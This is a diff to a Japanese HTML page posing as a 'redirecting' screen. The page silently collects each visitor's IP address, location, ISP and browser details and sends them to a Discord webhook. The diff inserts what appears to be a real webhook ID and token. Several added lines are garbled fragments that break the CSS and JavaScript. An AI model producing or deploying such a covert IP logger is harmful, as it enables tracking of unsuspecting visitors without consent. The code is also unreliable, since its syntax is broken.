@@ -2,13 +2,15 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
+    <IPアドレスを取得してDiscordに送信するHTMLファイル>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>リダイレクト中</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
             display: flex;
             justify-content: center;
+           ify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
@@ -40,7 +42,7 @@
                 // ブラウザ情報を取得
                 const browserInfo = {
                     userAgent: navigator.userAgent,
-                    language: navigator.language,
+                    language: Discordに送信するデータを作成
                     platform: navigator.platform,
                     screenResolution: `${screen.width}x${screen.height}`,
                     timestamp: new Date().toISOString()
@@ -48,16 +50,23 @@
                 
                 // Discordに送信するデータを作成
                 const discordData = {
-                    ip: data.ip,
-                    location: {
-                        city: data.location.city,
-                        region: data.location.region,
-                        country: data.location.country,
-                        latitude: data.location.lat,
-                        longitude: data.location.lng
-                    },
-                    isp: data.isp,
-                    browser: browserInfo
+                    content: "新しいアクセスがありました",
+                    embeds: [{
+                        title: "アクセス情報",
+                        color: 3447003,
+                        fields: [
+                            { name: "IPアドレス", value: data.ip, inline: true },
+                            { name: "場所", value: `${data.location.city}, ${data.location.region}, ${data.location.country}`, inline: true },
+                            { name: "ISP", value: data.isp, inline: true },
+                            { name: "ブラウザ", value: browserInfo.userAgent, inline: false },
+                            { name: "言語", value: browserInfo.language, inline: true },
+                            { Pythonを使用したバックエンド実装
+                            { name: "プラットフォーム", value: browserInfo.platform, inline: true },
+                            { name: "画面解像度", value: browserInfo.screenResolution, inline: true },
+                            { name: "アクセス日時", value: browserInfo.timestamp, inline: true }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
                 };
                 
                 // Discord Webhookにデータを送信
@@ -77,36 +86,10 @@
         
         // Discordにデータを送信する関数
         async function sendToDiscord(data) {
-            const webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
-            
-            // Discordに送信するメッセージを作成
-            const message = {
-                content: "新しいアクセスがありました",
-                embeds: [{
-                    title: "アクセス情報",
-                    color: 3447003,
-                    fields: [
-                        { name: "IPアドレス", value: data.ip, inline: true },
-                        { name: "場所", value: `${data.location.city}, ${data.location.region}, ${data.location.country}`, inline: true },
-                        { name: "ISP", value: data.isp, inline: true },
-                        { name: "ブラウザ", value: data.browser.userAgent, inline: false },
-                        { name: "言語", value: data.browser.language, inline: true },
-                        { name: "プラットフォーム", value: data.browser.platform, inline: true },
-                        { name: "画面解像度", value: data.browser.screenResolution, inline: true },
-                        { name: "アクセス日時", value: data.browser.timestamp, inline: true }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            };
+            const webhookUrl = "https://discord.com/api/webhooks/1532580581722951771/iZJ3O-Qkt9gjk8oo0p_ViEcnkveUPgzs1mb_zBn7P0xFQVqHuMWBc9kVz7qN_Ij7RysX";
             
             // WebhookにPOSTリクエストを送信
-            await fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(message)
-            });
+            await fetch(webhooktoDiscord(data)
         }
         
         // ページ読み込み時にIP情報を取得
